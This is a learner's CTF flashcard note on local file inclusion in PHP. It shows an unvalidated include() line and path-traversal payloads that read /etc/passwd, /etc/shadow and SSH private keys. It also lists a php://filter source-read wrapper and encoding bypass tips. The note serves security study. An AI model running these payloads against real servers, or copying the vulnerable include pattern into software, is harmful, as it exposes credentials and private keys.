---
aliases:
  - CTF Notes
  - CTF Learning
  - Capture The Flag
  - Computer system
  - Linux
  - LFI
  - Local file inclusion
tags:
  - flashcard/active/ctf
  - function/index
  - language/in/English
---

#flashcard What is LFI

Access to server's local files because of vulnerabilies

Example vulnerable PHP code

```php
include($_GET['page'] . ".php");
```
1. User input ($_GET['page']) is used directly without validation
2. The include() function will try to read and include ANY file the web server has access to
3. No restrictions on:
    - File path (../ can be used to traverse directories)
    - File type (can include any file, not just PHP)

Corresponding attack to the above vulnerability
```php
http://vulnerable.com/index.php?page=../../../etc/passwd

# Original intended use:
page=header.php

# Malicious uses:
page=../../../etc/passwd    # Read system users
page=../../../etc/shadow    # Read password hashes
page=../../.ssh/id_rsa      # Read SSH keys
```

#flashcard what are the common files to target? _(what files? server's local files, right?)_

```
/etc/passwd     # User information
/etc/hosts      # Network configuration
/proc/self/environ  # Environment variables
/var/log/apache2/access.log  # Web server logs
php://filter/convert.base64-encode/resource=index.php  # Read PHP source code
```

#flashcard What mindsets to acquire?


-    Try both absolute and relative paths _(what is absolute path and what is relative path)_
-    Use different encoding methods (URL encoding, double encoding) _(what is URL encoding and double encoding, how can they be applied, examples?)_
-    Look for wrapper bypasses (php://filter, zip://, data://) _(what are they, no idea whats rapper bypasses)_
